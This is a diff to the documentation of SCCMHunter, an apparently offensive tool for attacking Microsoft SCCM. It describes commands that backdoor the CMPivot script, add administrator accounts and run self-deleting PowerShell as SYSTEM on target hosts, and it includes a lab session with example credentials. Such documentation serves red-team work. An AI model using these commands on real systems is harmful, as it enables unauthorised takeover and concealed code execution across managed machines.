@@ -227,7 +227,7 @@ get_puser [username]
 () (C:\) >> 
 ```
 
-# get_user
+# get_user 
 
 ### Description
 
@@ -286,10 +286,11 @@ add_admin [username] [sid]
 
 # backdoor
 ### Description
-Replace the built-in CMPivot script stored in the site server database with a user supplied script. This command will not run unless a backup exists for the script to ensure the operator is able to undue/restore the backdoored script.
+Replace the built-in CMPivot script stored in the site server database with a user supplied script. This command will not run unless a backup exists for the script to ensure the operator is able to undue/restore the backdoored script. **Note: This is still a beta feature and not recommended to be used in production.**
 
 ### Usage
 
+backdoor [/path/to/script]
 
 ### Example
 ```
@@ -301,7 +302,7 @@ IMPORTANT: Did you backup the script first? There is no going back without it. Y
 ```
 # backup
 ### Description
-Backups the existing built-in CMPivot script. Required prior to any manipulation of the CMPivot script.
+Performs a back up of the existing built-in CMPivot script. Required prior to any manipulation of the CMPivot script. **Note: This is still a beta feature and not recommended to be used in production.**
 
 ### Usage
 ### Example
@@ -334,8 +335,9 @@ Remove a target administrator account from SCCM. Note: cannot be performed again
 
 # restore
 ### Description
-Restore a modified CMPivot script to its previous state.
+Restore a modified CMPivot script to its previous state. **Note: This is still a beta feature and not recommended to be used in production.**
 ### Usage
+
 ### Example
 ```
 (16777221) (C:\Users\) >> restore 
@@ -347,6 +349,8 @@ Restore a modified CMPivot script to its previous state.
 ### Description
 Execute a provided PowerShell script on a target host. The script is intended to be self deleting from the remote host as well as from the site database. If the hierarchy is configured to require script approval (default) alternate credentials must be specified to approve the script. Alternate credentials can be obtained by using the `add_admin` command to add a secondary account as an administrator.
 ### Usage
+script [/path/to/script]
+
 ### Examples
 #### Script approval not required
 
@@ -367,31 +371,21 @@ Exit and provide alternate approval credentials. Run script again.
 (16777221) (C:\) >> exit
                                                                                                                                                                                                                                        
 ┌──(root㉿kali)-[/opt/sccmhunter]
-└─# python3 sccmhunter.py admin -u lab\\administrator -p P@ssw0rd -ip 10.10.100.9 -au lowpriv -ap P@ssw0rd
-
-                                                                                          (
-                                    888                         d8                         \
- dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
-C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
- Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
-d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
-                                                                                         (
-                                                                 vdev0.0.3                   
-                                                                 @garrfoster                    
-    
-    
-    
-[23:08:05] INFO     [!] Enter help for extra shell commands                                                                                                                                                                            
-() C:\ >> interact 16777221
-(16777221) (C:\) >> shell cat /root/test.txt
-whoami
+└─# python3 sccmhunter.py admin -u lab\\administrator -p P@ssw0rd -ip 10.10.100.9 -au lowpriv -ap P@ssw0rd -debug
+SCCMHunter vdev0.0.3 by @garrfoster
+[14:13:07] DEBUG    [*] Database built.                                                                                                                                                            
+[14:13:07] INFO     [!] Enter help for extra shell commands                                                                                                                                        
+() C:\ >> shell nano /root/test.txt
+() (C:\) >> interact 16777221
 (16777221) (C:\) >> script /root/test.txt
-[23:08:36] INFO     [+] Updates script created successfully with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be.                                                                                                                            
-[23:08:39] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be approved.                                                                                                                                                
-[23:08:43] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be executed.                                                                                                                                                
-[23:09:04] INFO     [+] Got result:                                                                                                                                                                                                    
-[23:09:04] INFO     nt authority\\system                                                                                                                                                                                               
-[23:09:06] INFO     [+] Script with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be deleted.                                                                                                                                                 
+[14:13:36] INFO     [+] Updates script created successfully with GUID 405cde91-bb42-4d2f-9acd-7b3b3789ccd4.                                                                                        
+[14:13:36] DEBUG    [*] Using alternate credentials to approve script.                                                                                                                             
+[14:13:38] INFO     [+] Script with guid 405cde91-bb42-4d2f-9acd-7b3b3789ccd4 approved.                                                                                                            
+[14:13:40] INFO     [+] Script with guid 405cde91-bb42-4d2f-9acd-7b3b3789ccd4 executed.                                                                                                            
+[14:13:40] DEBUG    [+] Got OperationID: 16779568                                                                                                                                                  
+[14:13:58] INFO     [+] Got result:                                                                                                                                                                
+[14:13:58] INFO     nt authority\\system                                                                                                                                                           
+[14:13:59] INFO     [+] Script with GUID 405cde91-bb42-4d2f-9acd-7b3b3789ccd4 deleted.                                                                                                             
 (16777221) (C:\) >> 
 ```
 # show_admins
@@ -448,7 +442,7 @@ In the below example, the `dp` device is queried. In the result the `16777221` i
 Query the interactive device for members of the device's local administrators group.
 
 ### Usage
-See below.
+administrators
 
 ### Example
 ```
@@ -529,7 +523,6 @@ cat [filename]
 ### Description
 Change directories on the command line. This is required for both the `ls` and `cat` commands.
 
-
 ### Usage
 
 cd [filepath]
@@ -561,8 +554,11 @@ cd [filepath]
 ```
 
 # console_users
-### Description
+### Description 
+Returns data detailing the users that have logged on 
+
 ### Usage
+console_users
 ### Example
 ```
 (16777221) (C:\) >> console_users 
@@ -579,7 +575,10 @@ cd [filepath]
 
 # disk
 ### Description
+List available disk drives and space on the interactive system
+
 ### Usage
+disk
 ### Example
 ```
 (16777221) (C:\) >> disk
@@ -596,6 +595,7 @@ cd [filepath]
 
 # environment
 ### Description
+List environment variables from the interactive system
 ### Usage
 ### Example
 ```
@@ -756,7 +756,10 @@ ipconfig
 
 # list_disk
 ### Description
+
+Lists available disk drives on the interactive system
 ### Usage
+list_disk
 ### Example
 ```
 (16777221) (C:\) >> list_disk 
@@ -774,7 +777,7 @@ ipconfig
 
 # ls
 ### Description
-Will list the current directory represeted on the command line. Defaults to C:\. You must issue a cd command to another known directory (i.e. `cd C:\Users` to list the contents of that Users directory and so on.
+Will list the contents of the current directory represented on the command line. Defaults to C:\. You must issue a cd command to another known directory (i.e. `cd C:\Users` to list the contents of that Users directory and so on.
 ### Usage
 ls
 ### Example
